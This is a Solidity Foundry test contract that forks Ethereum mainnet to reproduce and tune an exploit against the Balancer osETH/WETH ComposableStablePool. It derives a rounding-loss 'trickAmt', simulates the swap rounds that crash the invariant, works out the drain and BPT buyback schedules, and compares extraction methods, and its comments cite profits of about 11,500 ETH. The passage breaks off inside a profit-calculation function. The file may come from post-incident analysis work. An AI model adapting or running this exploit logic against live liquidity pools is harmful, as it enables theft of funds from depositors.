// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/Console.sol";
import {IBasePool} from "src/interfaces/IBasePool.sol";
import {IVault} from "src/interfaces/IVault.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {FixedPoint} from "src/FixedPoint.sol";
import {SwapMath} from "src/SwapMath.sol";
import {StableMath} from "src/StableMath.sol";

contract SearchParams is Test {
    using FixedPoint for uint256;

    SwapMath internal swapMath;
    IBasePool constant OSETH_BPT = IBasePool(address(0xDACf5Fa19b1f720111609043ac67A9818262850c));
    IVault constant VAULT = IVault(address(0xBA12222222228d8Ba445958a75a0704d566BF2C8));

    uint256 internal amp;
    uint256 internal swapFeePercentage;
    uint256 internal protocolSwapFeePercentage; // protocol swap fee cache (50% = 5e17)
    uint256[] internal sf; // scaling factors for [WETH, osETH]

    function setUp() public {
        vm.createSelectFork("ETH", 23717396);
        vm.warp(1762156007); // block 23717397's timestamp, so rate provider returns the same rate as the real attack
        swapMath = new SwapMath();

        // Fetch pool parameters
        (amp,,) = OSETH_BPT.getAmplificationParameter();
        swapFeePercentage = OSETH_BPT.getSwapFeePercentage();
        protocolSwapFeePercentage = OSETH_BPT.getProtocolFeePercentageCache(0); // SWAP = type 0

        // Update rate caches
        address[] memory rateProviders = OSETH_BPT.getRateProviders();
        IERC20[] memory tokens;
        (tokens,,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
        for (uint256 i = 0; i < rateProviders.length; i++) {
            if (rateProviders[i] != address(0)) {
                OSETH_BPT.updateTokenRateCache(tokens[i]);
            }
        }

        // Get scaling factors for WETH (index 0) and osETH (index 2)
        uint256[] memory allSF = OSETH_BPT.getScalingFactors();
        sf = new uint256[](2);
        sf[0] = allSF[0]; // WETH
        sf[1] = allSF[2]; // osETH
    }

    /// @notice Try a single swap. Reverts if it triggers BAL#004 or any math error.
    function trySwap(
        uint256 balWETH,
        uint256 balOSETH,
        uint256 indexIn,
        uint256 indexOut,
        uint256 swapOutAmount
    ) external view returns (uint256 newBalWETH, uint256 newBalOSETH) {
        uint256[] memory bal = new uint256[](2);
        uint256[] memory scalingFactors = new uint256[](2);
        bal[0] = balWETH;
        bal[1] = balOSETH;
        scalingFactors[0] = sf[0];
        scalingFactors[1] = sf[1];
        bal = swapMath.getAfterSwapOutBalances(bal, scalingFactors, indexIn, indexOut, swapOutAmount, amp, swapFeePercentage);
        return (bal[0], bal[1]);
    }

    /// @notice Like trySwap but also returns the post-swap invariant (for invariant threading)
    function trySwapWithInvariant(
        uint256 balWETH,
        uint256 balOSETH,
        uint256 indexIn,
        uint256 indexOut,
        uint256 swapOutAmount
    ) external view returns (uint256 newBalWETH, uint256 newBalOSETH, uint256 postInvariant) {
        uint256[] memory bal = new uint256[](2);
        uint256[] memory scalingFactors = new uint256[](2);
        bal[0] = balWETH;
        bal[1] = balOSETH;
        scalingFactors[0] = sf[0];
        scalingFactors[1] = sf[1];
        (bal, postInvariant) = swapMath.getAfterSwapOutBalancesAndPostInvariant(bal, scalingFactors, indexIn, indexOut, swapOutAmount, amp, swapFeePercentage);
        return (bal[0], bal[1], postInvariant);
    }

    /// @notice Truncate to keep only the 2 most significant digits.
    /// e.g. 324816 -> 320000, 67123 -> 67000, 1234 -> 1200
    /// Formula: floor(x / 10^(d-2)) * 10^(d-2), where d = number of digits.
    function _truncateToTop2Digits(uint256 x) internal pure returns (uint256) {
        if (x < 100) return x; // 1-2 digit numbers: no truncation needed
        uint256 power = 1;
        uint256 temp = x;
        while (temp >= 100) {
            temp /= 10;
            power *= 10;
        }
        // power = 10^(d-2), temp = first 2 digits
        return temp * power;
    }

    /// @notice Compute Swap 3 extraction amount using the attacker's actual method
    /// (confirmed by BlockSec analysis):
    /// 1. Truncate WETH balance to top 2 significant digits (e.g. 324816 → 320000)
    /// 2. If swap fails, retry with 9/10 fallback (up to 2 retries).
    ///    The primary failure mode of Attempt 1 is BAL#004 (ZERO_DIVISION), NOT
    ///    Newton-Raphson divergence (BAL#321/BAL#322).
    ///    Root cause: _truncateToTop2Digits extracts ~98-99% of balWETH, leaving a
    ///    tiny remainder. Inside _getTokenBalanceGivenInvariantAndAllOtherBalances,
    ///    P_D = floor(4 * remainder * balOSETH / D). Since balOSETH=1 (D-crashed)
    ///    and remainder << D, P_D floors to 0, causing Math.divUp(inv2, 0) to revert.
    ///    The ×0.9 fallback reduces swapOut3, increasing the remainder ~9×, which
    ///    raises P_D above 0 and avoids the ZERO_DIVISION.
    /// Returns (swapOut3, newBalWETH, newBalOSETH). Reverts if all 3 attempts fail.
    function _computeSwap3(uint256 balWETH, uint256 balOSETH) external returns (uint256, uint256, uint256) {
        uint256 swapOut3 = _truncateToTop2Digits(balWETH);
        // parameters [950 / 1000, 66000,  30] make total profit 11514 ETH
        // parameters [850 / 1000, 94000,  30] make total profit 11560 ETH
        // parameters [920 / 1000, 100000, 30] make total profit 11572 ETH
        // parameters [920 / 1000, 238000, 30] make total profit 11660 ETH
        // uint256 swapOut3 = balWETH * 999 / 1000;

        // Attempt 1: truncated amount
        try this.trySwap(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o) {
            return (swapOut3, w, o);
        } catch {}

        //console.log("Attempt 2: 9/10 fallback");
        // Attempt 2: 9/10 fallback
        swapOut3 = swapOut3 * 9 / 10;
        try this.trySwap(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o) {
            return (swapOut3, w, o);
        } catch {}

        //console.log("Attempt 3: 9/10 of 9/10 fallback");
        // Attempt 3: 9/10 of 9/10 fallback
        swapOut3 = swapOut3 * 9 / 10;
        try this.trySwap(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o) {
            return (swapOut3, w, o);
        } catch {}

        revert("Swap 3 failed after 3 attempts");
    }

    /// @notice Like _computeSwap3 but also returns the post-swap invariant
    function _computeSwap3WithInvariant(uint256 balWETH, uint256 balOSETH) external returns (uint256, uint256, uint256, uint256) {
        uint256 swapOut3 = _truncateToTop2Digits(balWETH);

        try this.trySwapWithInvariant(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o, uint256 inv) {
            return (swapOut3, w, o, inv);
        } catch {}

        swapOut3 = swapOut3 * 9 / 10;
        try this.trySwapWithInvariant(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o, uint256 inv) {
            return (swapOut3, w, o, inv);
        } catch {}

        swapOut3 = swapOut3 * 9 / 10;
        try this.trySwapWithInvariant(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o, uint256 inv) {
            return (swapOut3, w, o, inv);
        } catch {}

        revert("Swap 3 (inv) failed after 3 attempts");
    }

    /// @notice Simulate one D-crash round (3 swaps). Reverts if any swap fails.
    /// Called via this.simulateOneRound() so try/catch can intercept reverts.
    /// Swap 3 uses binary search to find maximum extractable WETH.
    function simulateOneRound(
        uint256 balWETH,
        uint256 balOSETH,
        uint256 trickAmt
    ) external returns (uint256 newBalWETH, uint256 newBalOSETH) {
        uint256[] memory currentBal = new uint256[](2);
        uint256[] memory tempBal;
        uint256[] memory scalingFactors = new uint256[](2);

        // Swap 1: drain osETH to trickAmt + 1
        currentBal[0] = balWETH;
        currentBal[1] = balOSETH;
        scalingFactors[0] = sf[0];
        scalingFactors[1] = sf[1];
        uint256 swapOut1 = currentBal[1] - trickAmt - 1;
        tempBal = swapMath.getAfterSwapOutBalances(currentBal, scalingFactors, 0, 1, swapOut1, amp, swapFeePercentage);

        // Swap 2: drain remaining trickAmt from osETH (triggers precision loss)
        scalingFactors[0] = sf[0];
        scalingFactors[1] = sf[1];
        tempBal = swapMath.getAfterSwapOutBalances(tempBal, scalingFactors, 0, 1, trickAmt, amp, swapFeePercentage);

        // Swap 3: truncation + 9/10 retry (like the real attacker's method)
        try this._computeSwap3(tempBal[0], tempBal[1]) returns (uint256 swapOut3, uint256 w, uint256 o) {
            return (w, o);
        } catch {revert("Swap 3 failed");}
    }

    /// @notice Like simulateOneRound but also returns the stored invariant after the last swap
    function simulateOneRoundWithInvariant(
        uint256 balWETH,
        uint256 balOSETH,
        uint256 trickAmt
    ) external returns (uint256 newBalWETH, uint256 newBalOSETH, uint256 postRoundInvariant) {
        uint256[] memory currentBal = new uint256[](2);
        uint256[] memory tempBal;
        uint256[] memory scalingFactors = new uint256[](2);

        // Swap 1: drain osETH to trickAmt + 1
        currentBal[0] = balWETH;
        currentBal[1] = balOSETH;
        scalingFactors[0] = sf[0];
        scalingFactors[1] = sf[1];
        uint256 swapOut1 = currentBal[1] - trickAmt - 1;
        tempBal = swapMath.getAfterSwapOutBalances(currentBal, scalingFactors, 0, 1, swapOut1, amp, swapFeePercentage);

        // Swap 2: drain remaining trickAmt from osETH (triggers precision loss)
        scalingFactors[0] = sf[0];
        scalingFactors[1] = sf[1];
        tempBal = swapMath.getAfterSwapOutBalances(tempBal, scalingFactors, 0, 1, trickAmt, amp, swapFeePercentage);

        // Swap 3: truncation + 9/10 retry — returns invariant
        try this._computeSwap3WithInvariant(tempBal[0], tempBal[1]) returns (uint256, uint256 w, uint256 o, uint256 inv) {
            return (w, o, inv);
        } catch {revert("Swap 3 (inv) failed");}
    }

    /// @notice Swap 3 using 999/1000 method instead of truncation
    function _computeSwap3_999(uint256 balWETH, uint256 balOSETH) external returns (uint256, uint256, uint256) {
        uint256 swapOut3 = balWETH * 999 / 1000;

        // Attempt 1
        try this.trySwap(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o) {
            return (swapOut3, w, o);
        } catch {}

        // Attempt 2: 9/10 fallback
        swapOut3 = swapOut3 * 9 / 10;
        try this.trySwap(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o) {
            return (swapOut3, w, o);
        } catch {}

        // Attempt 3: 9/10 of 9/10 fallback
        swapOut3 = swapOut3 * 9 / 10;
        try this.trySwap(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o) {
            return (swapOut3, w, o);
        } catch {}

        revert("Swap 3 (999) failed after 3 attempts");
    }

    /// @notice Simulate one round using 999/1000 method for Swap 3
    function simulateOneRound_999(
        uint256 balWETH,
        uint256 balOSETH,
        uint256 trickAmt
    ) external returns (uint256 newBalWETH, uint256 newBalOSETH) {
        uint256[] memory currentBal = new uint256[](2);
        uint256[] memory tempBal;
        uint256[] memory scalingFactors = new uint256[](2);

        currentBal[0] = balWETH;
        currentBal[1] = balOSETH;
        scalingFactors[0] = sf[0];
        scalingFactors[1] = sf[1];
        uint256 swapOut1 = currentBal[1] - trickAmt - 1;
        tempBal = swapMath.getAfterSwapOutBalances(currentBal, scalingFactors, 0, 1, swapOut1, amp, swapFeePercentage);

        scalingFactors[0] = sf[0];
        scalingFactors[1] = sf[1];
        tempBal = swapMath.getAfterSwapOutBalances(tempBal, scalingFactors, 0, 1, trickAmt, amp, swapFeePercentage);

        try this._computeSwap3_999(tempBal[0], tempBal[1]) returns (uint256, uint256 w, uint256 o) {
            return (w, o);
        } catch { revert("Swap 3 (999) failed"); }
    }

    /// @notice Compare truncation vs 999/1000 for Swap 3 extraction
    function test_compareSwap3Methods() public {
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
        uint256 N = 30;
        uint256 remain = 67000;

        console.log("=== COMPARE SWAP 3 METHODS: truncation vs 999/1000 ===");
        console.log("remain:", remain, "N:", N);

        // --- Method 1: Truncation (real attacker) ---
        uint256 bW1 = remain; uint256 bO1 = remain;
        uint256 d_initial = _getInvariant(bW1, bO1);
        console.log("D_initial:", d_initial);

        console.log("--- Truncation method (per-round) ---");
        for (uint256 r = 0; r < N; r++) {
            (bW1, bO1) = this.simulateOneRound(bW1, bO1, trickAmt);
            if (r < 5 || r >= N - 3) {
                console.log("Round:", r);
                console.log("WETH:", bW1);
                console.log("osETH:", bO1);
                console.log("    D=", _getInvariant(bW1, bO1));
            }
        }
        uint256 d_trunc = _getInvariant(bW1, bO1);
        console.log("Truncation final: WETH=", bW1, "osETH=", bO1);
        console.log("D=", d_trunc);

        // --- Method 2: 999/1000 ---
        uint256 bW2 = remain; uint256 bO2 = remain;

        console.log("--- 999/1000 method (per-round) ---");
        uint256 roundsOk = 0;
        for (uint256 r = 0; r < N; r++) {
            try this.simulateOneRound_999(bW2, bO2, trickAmt) returns (uint256 w, uint256 o) {
                bW2 = w; bO2 = o;
                roundsOk++;
                if (r < 5 || r >= N - 3) {
                    console.log("Round:", r);
                    console.log("WETH:", bW2);
                    console.log("osETH:", bO2);
                    console.log("    D=", _getInvariant(bW2, bO2));
                }
            } catch {
                console.log("  Round", r, ": REVERTED");
                break;
            }
        }
        uint256 d_999 = _getInvariant(bW2, bO2);
        console.log("999/1000 final: WETH=", bW2, "osETH=", bO2);
        console.log("D=", d_999);
        console.log("999/1000 rounds completed:", roundsOk);

        // --- Summary ---
        console.log("=== SUMMARY ===");
        console.log("D_initial:", d_initial);
        console.log("D_trunc:", d_trunc, "deflation_bps:", (d_initial - d_trunc) * 10000 / d_initial);
        if (roundsOk > 0) {
            console.log("D_999:", d_999, "deflation_bps:", (d_initial - d_999) * 10000 / d_initial);
        }
        uint256 cost_trunc = 2 * remain - (bW1 + bO1);
        uint256 cost_999 = 2 * remain - (bW2 + bO2);
        console.log("Cycling cost (truncation):", cost_trunc);
        console.log("Cycling cost (999/1000):", cost_999);
    }

    /// @notice Derive trickAmt analytically: trickAmt = floor(1e18 / (sf - 1e18))
    /// This is the maximum x such that mulDown(x, sf) == x (total precision loss).
    function test_deriveTrickAmt() public view {
        console.log("=== ANALYTICAL: trickAmt = floor(1e18 / (sf_osETH - 1e18)) ===");
        console.log("sf[WETH]:", sf[0]);
        console.log("sf[osETH]:", sf[1]);

        uint256 delta = sf[1] - FixedPoint.ONE;
        uint256 trickAmt = FixedPoint.ONE / delta;

        console.log("delta (sf - 1e18):", delta);
        console.log("trickAmt:", trickAmt);

        // Verify: mulDown(trickAmt, sf) == trickAmt
        uint256 upscaled = trickAmt * sf[1] / FixedPoint.ONE;
        uint256 upscaledNext = (trickAmt + 1) * sf[1] / FixedPoint.ONE;
        console.log("mulDown(trickAmt, sf):", upscaled, "== trickAmt?", upscaled == trickAmt);
        console.log("mulDown(trickAmt+1, sf):", upscaledNext, "== trickAmt+1?", upscaledNext == trickAmt + 1);

        require(upscaled == trickAmt, "trickAmt precision loss must hold");
        require(upscaledNext > trickAmt + 1, "trickAmt+1 must break precision loss");
    }

    /// @notice Helper: compute invariant D for given balances (already in internal representation)
    function _getInvariant(uint256 balWETH, uint256 balOSETH) internal view returns (uint256) {
        uint256[] memory bal = new uint256[](2);
        uint256[] memory scalingFactors = new uint256[](2);
        bal[0] = balWETH;
        bal[1] = balOSETH;
        scalingFactors[0] = sf[0];
        scalingFactors[1] = sf[1];
        return swapMath.calculateInvariant(amp, bal, scalingFactors);
    }
    /// @notice Generate Step 3 BPT purchase schedule using 1000x geometric series.
    ///
    /// Principle: after D crashes, BPT is nearly free. The attacker needs to buy back
    /// ~1e22 BPT spanning 18 orders of magnitude. A 1000x geometric series covers this
    /// range in just 7 steps (1e4 → 1e7 → 1e10 → 1e13 → 1e16 → 1e19 → 1e22), which is
    /// the most gas-efficient approach. The remainder after the geometric steps is split
    /// into 2 equal parts. Total: 9 swaps, alternating WETH/osETH.
    ///
    /// This is the same deterministic algorithm used in the real attack transaction.
    function _generateStep3Amounts(uint256 totalTarget, uint256 maxLength)
        internal pure returns (uint256[] memory amounts, uint256 count)
    {
        amounts = new uint256[](maxLength);
        uint256 accumulated = 10000;
        uint256 nowValue = 10000;
        amounts[0] = 10000;
        count = 1;

        for (uint256 i = 1; i < maxLength; i++) {
            if (totalTarget > accumulated + 1000 * nowValue) {
                accumulated += 1000 * nowValue;
                nowValue = nowValue * 1000;
                amounts[i] = nowValue;
                count++;
            } else {
                uint256 rem = totalTarget - nowValue;
                amounts[i] = rem / 2 + 1;
                amounts[i + 1] = rem / 2 + 1;
                count += 2;
                break;
            }
        }
    }

    /// @notice Simulate Step 3: buy back BPT using alternating WETH/osETH swaps,
    /// matching ComposableStablePool's _onJoinSwap logic with dynamic D recovery.
    ///
    /// Each swap is processed sequentially: compute token cost via StableMath, update
    /// pool balances (full amountIn including fee), and increase virtualSupply.
    /// This mirrors the Vault's sequential batchSwap processing.
    function _simulateStep3Repayment(
        uint256 balWETH,
        uint256 balOSETH,
        uint256 bptToBuy,
        uint256 virtualSupply,
        uint256 initialStoredInvariant
    ) internal view returns (uint256 totalCost) {
        (uint256[] memory bptAmounts, uint256 swapCount) = _generateStep3Amounts(bptToBuy, 20);

        uint256 bW = balWETH;
        uint256 bO = balOSETH;
        uint256 supply = virtualSupply;
        // Track stored invariant for between-swap protocol fees.
        // Use the post-Phase2 stored invariant (threaded from cycling's last swap).
        uint256 storedInvariant = initialStoredInvariant;
        for (uint256 i = 0; i < swapCount; i++) {
            uint256 preInvariant = _getInvariant(bW, bO);

            // Between-swap fee: _payProtocolFeesBeforeJoinExit mints BPT if
            // fresh invariant exceeds stored invariant from the previous swap.
            supply += _calcBeforeSwapFeeBpt(preInvariant, storedInvariant, supply);

            uint256 preSupply = supply;

            uint256[] memory bal = new uint256[](2);
            uint256[] memory scalingFactors = new uint256[](2);
            bal[0] = bW;
            bal[1] = bO;
            scalingFactors[0] = sf[0];
            scalingFactors[1] = sf[1];

            uint256 tokenIndex = i % 2 == 0 ? 0 : 1;

            (uint256 amountIn, uint256 postInv) = swapMath.getTokenInForBptOutAndPostInvariant(
                bal, scalingFactors, tokenIndex, bptAmounts[i], supply, amp, swapFeePercentage
            );

            if (tokenIndex == 0) {
                bW += amountIn;
            } else {
                bO += amountIn;
            }
            supply += bptAmounts[i];
            totalCost += amountIn;

            // After-swap fee: _updateInvariantAfterJoinExit
            supply += _calcProtocolFeeBpt(preInvariant, preSupply, postInv, supply);
            // Store the post-swap invariant for the next between-swap check
            storedInvariant = postInv;
        }
    }


    /// @notice Debug version of _simulateStep3Repayment with per-swap logging
    function _simulateStep3RepaymentDebug(
        uint256 balWETH,
        uint256 balOSETH,
        uint256 bptToBuy,
        uint256 virtualSupply,
        uint256 initialStoredInvariant
    ) internal returns (uint256 totalCost) {
        (uint256[] memory bptAmounts, uint256 swapCount) = _generateStep3Amounts(bptToBuy, 20);

        uint256 bW = balWETH;
        uint256 bO = balOSETH;
        uint256 supply = virtualSupply;

        console.log("Step3 swapCount:", swapCount);
        uint256 totalBpt = 0;
        for (uint256 i = 0; i < swapCount; i++) {
            totalBpt += bptAmounts[i];
        }
        console.log("Step3 totalBpt:", totalBpt);

        uint256 storedInvariant = initialStoredInvariant;
        for (uint256 i = 0; i < swapCount; i++) {
            uint256 preInvariant = _getInvariant(bW, bO);

            // Between-swap fee
            uint256 beforeFee = _calcBeforeSwapFeeBpt(preInvariant, storedInvariant, supply);
            supply += beforeFee;

            uint256 preSupply = supply;

            uint256[] memory bal = new uint256[](2);
            uint256[] memory scalingFactors = new uint256[](2);
            bal[0] = bW;
            bal[1] = bO;
            scalingFactors[0] = sf[0];
            scalingFactors[1] = sf[1];

            uint256 tokenIndex = i % 2 == 0 ? 0 : 1;

            (uint256 amountIn, uint256 postInv) = swapMath.getTokenInForBptOutAndPostInvariant(
                bal, scalingFactors, tokenIndex, bptAmounts[i], supply, amp, swapFeePercentage
            );

            console.log("  Swap", i);
            console.log("    token:", tokenIndex == 0 ? "WETH" : "osETH");
            console.log("    bptOut:", bptAmounts[i]);
            console.log("    tokenIn:", amountIn);
            console.log("    supply_before:", supply);
            console.log("    balW:", bW, "balO:", bO);
            if (beforeFee > 0) {
                console.log("    beforeSwapFeeBpt:", beforeFee);
            }

            if (tokenIndex == 0) {
                bW += amountIn;
            } else {
                bO += amountIn;
            }
            supply += bptAmounts[i];
            totalCost += amountIn;

            // After-swap fee
            uint256 protocolBpt = _calcProtocolFeeBpt(preInvariant, preSupply, postInv, supply);
            if (protocolBpt > 0) {
                console.log("    protocolBptMinted:", protocolBpt);
            }
            supply += protocolBpt;
            storedInvariant = postInv;
        }
    }

    /// @notice Generate Step 1 token extraction amounts using the real attack's geometric decay:
    /// each step takes (remaining - target) * 99 / 100 of the token.
    function _generateStep1Amounts(uint256 balance, uint256 targetRemain, uint256 maxLength)
        internal pure returns (uint256[] memory amounts, uint256 count)
    {
        amounts = new uint256[](maxLength);
        uint256 preAmount = 0;
        uint256 sumAmount = 0;
        count = 0;

        for (uint256 i = 0; i < maxLength; i++) {
            uint256 amount;
            if (preAmount == 0) {
                preAmount = 99 * balance - 99 * targetRemain;
            } else {
                preAmount = preAmount - 99 * (preAmount / 100);
            }
            amount = preAmount / 100;
            uint256 nextAmount = preAmount - 99 * (preAmount / 100);
            if (nextAmount < 100) {
                amount = balance - sumAmount - targetRemain;
                amounts[i] = amount;
                count++;
                break;
            } else {
                sumAmount += amount;
                amounts[i] = amount;
                count++;
            }
        }
    }

    /// @notice Simulate Step 1: drain pool from real balances to targetRemain using GIVEN_OUT
    /// BPT→token swaps. Uses the geometric decay schedule (99/100 of excess each step),
    /// alternating between WETH and osETH exits.
    /// Returns (totalBptSold, totalTokensOut, remainingVirtualSupply).
    ///
    /// Key insight: virtualSupply = totalSupply - registeredBptBalance.
    /// During batchSwap, the Vault updates registered balances between swaps.
    /// Each exit sends BPT into the pool (registered BPT balance ↑), so virtualSupply ↓.
    /// After each exit, the pool calls _updateInvariantAfterJoinExit which mints protocol
    /// fee BPT when the swap fee causes the invariant to decrease less than proportionally
    /// to the supply decrease. This increases virtualSupply slightly after each swap.
    function _simulateStep1Extraction(
        uint256 realWETH,
        uint256 realOSETH,
        uint256 targetRemain,
        uint256 bptSupply
    ) internal view returns (uint256 totalBptSold, uint256 totalTokensOut, uint256 remainingSupply, uint256 lastPostJoinExitInvariant) {
        // Generate token extraction schedules (same pattern as real attack)
        (uint256[] memory wethAmounts, uint256 wethCount) = _generateStep1Amounts(realWETH, targetRemain, 15);
        (uint256[] memory osethAmounts, uint256 osethCount) = _generateStep1Amounts(realOSETH, targetRemain, 15);

        uint256 bW = realWETH;
        uint256 bO = realOSETH;
        uint256 supply = bptSupply;

        // Use the fresh invariant from current balances for all steps.
        // The real Balancer _beforeJoinExit updates the stored invariant to freshInvariant
        // before the first swap, so step 0 uses freshInvariant as preJoinExitInvariant.
        // (The stored _lastPostJoinExitInvariant may reflect an older osETH rate and would
        //  be significantly lower than fresh, causing over-estimation of protocol fees.)

        // Interleave: alternate WETH and osETH exits (matching real attack's swap ordering)
        uint256 maxSwaps = wethCount > osethCount ? wethCount : osethCount;
        for (uint256 i = 0; i < maxSwaps; i++) {
            // WETH exit: BPT → WETH (GIVEN_OUT, amount = token output desired)
            if (i < wethCount) {
                uint256 preInvariant = _getInvariant(bW, bO);
                uint256 preSupply = supply;

                uint256 tokenOut = wethAmounts[i];
                uint256[] memory bal = new uint256[](2);
                uint256[] memory scalingFactors = new uint256[](2);
                bal[0] = bW; bal[1] = bO;
                scalingFactors[0] = sf[0]; scalingFactors[1] = sf[1];

                uint256 bptIn = swapMath.getBptInForTokenOut(
                    bal, scalingFactors, 0, tokenOut, supply, amp, swapFeePercentage
                );
                uint256 postInv = _calcPostInvariant(bW, bO, 0, tokenOut, false);
                bW -= tokenOut;
                supply -= bptIn;
                totalBptSold += bptIn;
                totalTokensOut += tokenOut;

                // Protocol fee minting (mirrors _updateInvariantAfterJoinExit)
                supply += _calcProtocolFeeBpt(preInvariant, preSupply, postInv, supply);
                // Track the stored invariant (mirrors _updatePostJoinExit)
                lastPostJoinExitInvariant = postInv;
            }
            // osETH exit: BPT → osETH (GIVEN_OUT)
            if (i < osethCount) {
                uint256 preInvariant = _getInvariant(bW, bO);
                uint256 preSupply = supply;

                uint256 tokenOut = osethAmounts[i];
                uint256[] memory bal = new uint256[](2);
                uint256[] memory scalingFactors = new uint256[](2);
                bal[0] = bW; bal[1] = bO;
                scalingFactors[0] = sf[0]; scalingFactors[1] = sf[1];

                uint256 bptIn = swapMath.getBptInForTokenOut(
                    bal, scalingFactors, 1, tokenOut, supply, amp, swapFeePercentage
                );
                uint256 postInv = _calcPostInvariant(bW, bO, 1, tokenOut, false);
                bO -= tokenOut;
                supply -= bptIn;
                totalBptSold += bptIn;
                totalTokensOut += tokenOut;

                // Protocol fee minting (mirrors _updateInvariantAfterJoinExit)
                supply += _calcProtocolFeeBpt(preInvariant, preSupply, postInv, supply);
                // Track the stored invariant (mirrors _updatePostJoinExit)
                lastPostJoinExitInvariant = postInv;
            }
        }
        remainingSupply = supply;
    }

    /// @notice Compute post-swap invariant using Balancer's upscale-then-operate order.
    /// In the real contract, balances are upscaled BEFORE the token delta is applied.
    /// This avoids 1-wei rounding discrepancies from floor((a±b)*s/1e18) vs floor(a*s/1e18)±floor(b*s/1e18).
    function _calcPostInvariant(
        uint256 preBW,
        uint256 preBO,
        uint256 tokenIndex,
        uint256 tokenDelta,
        bool isJoin
    ) internal view returns (uint256) {
        uint256[] memory bal = new uint256[](2);
        bal[0] = preBW * sf[0] / FixedPoint.ONE;
        bal[1] = preBO * sf[1] / FixedPoint.ONE;
        uint256 scaledDelta = tokenDelta * sf[tokenIndex] / FixedPoint.ONE;
        if (isJoin) {
            bal[tokenIndex] += scaledDelta;
        } else {
            bal[tokenIndex] -= scaledDelta;
        }
        return StableMath._calculateInvariant(amp, bal);
    }

    /// @notice Calculate protocol fee BPT to mint after a join/exit swap.
    /// Mirrors Balancer V2's _updateInvariantAfterJoinExit logic:
    /// - feelessInvariant = preInvariant * postSupply / preSupply
    /// - If postInvariant > feelessInvariant, the excess is swap fee growth
    /// - Protocol gets protocolSwapFeePercentage of the growth, minted as BPT
    function _calcProtocolFeeBpt(
        uint256 preInvariant,
        uint256 preSupply,
        uint256 postInvariant,
        uint256 postSupply
    ) internal view returns (uint256) {

        // feelessInvariant = preInvariant * (postSupply / preSupply)
        // This is what D would be if the exit were proportional (no swap fee)
        uint256 supplyRatio = postSupply.divDown(preSupply);
        uint256 feelessInvariant = preInvariant.mulDown(supplyRatio);

        if (postInvariant <= feelessInvariant) return 0;

        // The excess invariant is the swap fee's contribution
        uint256 invariantDelta = postInvariant - feelessInvariant;

        // Real Balancer uses Math.divDown(Math.mul(delta, fee), postInvariant)
        // = (delta * fee) / postInvariant  (single rounding, no intermediate truncation)
        // NOT mulDown().divDown() which double-rounds and loses precision for small delta
        uint256 protocolOwnership = (invariantDelta * protocolSwapFeePercentage) / postInvariant;

        if (protocolOwnership == 0) return 0;

        // Real Balancer: ExternalFees.bptForPoolOwnershipPercentage uses
        // Math.divDown(Math.mul(supply, ownership), complement)
        // = (supply * ownership) / complement  (single rounding)
        return (postSupply * protocolOwnership) / protocolOwnership.complement();
    }

    /// @notice Calculate protocol fee BPT minted by _payProtocolFeesBeforeJoinExit between
    /// consecutive BPT swaps within the same transaction.
    /// Within a single tx (rates unchanged), the three growth invariants collapse to
    /// freshInvariant, so the formula simplifies to:
    ///   ownership = (freshInv - storedInv).divDown(freshInv).mulDown(protocolSwapFeePercentage)
    ///   feeBpt = supply * ownership / complement(ownership)
    function _calcBeforeSwapFeeBpt(
        uint256 freshInvariant,
        uint256 lastPostJoinExitInvariant,
        uint256 supply
    ) internal view returns (uint256) {
        if (freshInvariant <= lastPostJoinExitInvariant) return 0;
        uint256 delta = freshInvariant - lastPostJoinExitInvariant;
        // Matches _getProtocolPoolOwnershipPercentage: divDown then mulDown (two separate roundings)
        uint256 swapFeeFraction = delta * FixedPoint.ONE / freshInvariant; // divDown
        uint256 ownership = swapFeeFraction * protocolSwapFeePercentage / FixedPoint.ONE; // mulDown
        if (ownership == 0) return 0;
        // ExternalFees.bptForPoolOwnershipPercentage: Math.divDown(Math.mul(supply, ownership), complement)
        return (supply * ownership) / ownership.complement();
    }

    /// @notice Calculate BPT that the real Balancer contract mints as yield fees before the
    /// first swap of a batchSwap batch.
    /// Mirrors ComposableStablePool._payProtocolFeesBeforeJoinExit:
    ///   yieldOwnership = (freshInvariant - storedInvariant) / freshInvariant * yieldFeePercentage
    ///   yieldFeeBpt = supply * yieldOwnership / (1 - yieldOwnership)
    function _calcYieldFeeBpt(
        uint256 freshInvariant,
        uint256 storedInvariant,
        uint256 supply
    ) internal view returns (uint256) {
        if (freshInvariant <= storedInvariant) return 0;
        // protocolYieldFeePercentage is at cache type 2 (YIELD) per IBasePool.sol comment
        uint256 yieldFeePercentage = OSETH_BPT.getProtocolFeePercentageCache(2);
        if (yieldFeePercentage == 0) return 0;
        uint256 delta = freshInvariant - storedInvariant;
        // fraction = delta / freshInvariant  (FixedPoint.divDown)
        // yieldOwnership = fraction * yieldFeePercentage  (FixedPoint.mulDown)
        uint256 yieldOwnership = (delta * FixedPoint.ONE / freshInvariant) * yieldFeePercentage / FixedPoint.ONE;
        if (yieldOwnership == 0) return 0;
        // bptForPoolOwnershipPercentage: supply * ownership / complement
        return (supply * yieldOwnership) / yieldOwnership.complement();
    }

    /// @notice Helper: compute profit for a given remain value using high-fidelity simulation.
    /// Chains virtualSupply from Step 1 → Step 3 for accurate pricing.
    /// Phase 2 (token↔token swaps) does NOT update _lastPostJoinExitInvariant in the real contract,
    /// so Phase 3 sees the invariant stored after Phase 1's last exit.
    function _computeProfit(
        uint256 remain,
        uint256 wAfter,
        uint256 oAfter,
        uint256 realWETH,
        uint256 realOSETH,
        uint256 totalBPT
    ) internal view returns (uint256) {
        (uint256 bptSold, uint256 tokensExtracted, uint256 postStep1Supply, uint256 phase1Invariant) =
            _simulateStep1Extraction(realWETH, realOSETH, remain, totalBPT);
        uint256 sumAfter = wAfter + oAfter;
        // The pool loses (2*remain - sumAfter) tokens during cycling, which flow to the attacker.
